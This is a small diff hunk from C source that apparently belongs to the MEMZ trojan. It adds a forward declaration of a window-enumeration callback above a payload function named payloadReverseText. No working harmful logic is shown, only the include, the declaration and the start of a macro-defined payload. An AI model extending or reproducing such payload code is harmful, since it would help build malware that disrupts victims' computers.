@@ -1,5 +1,7 @@
 #include "../MEMZ.h"
 
+BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
+
 PAYLOADFUNCTIONDEFAULT(payloadReverseText) {
 	PAYLOADHEAD
 
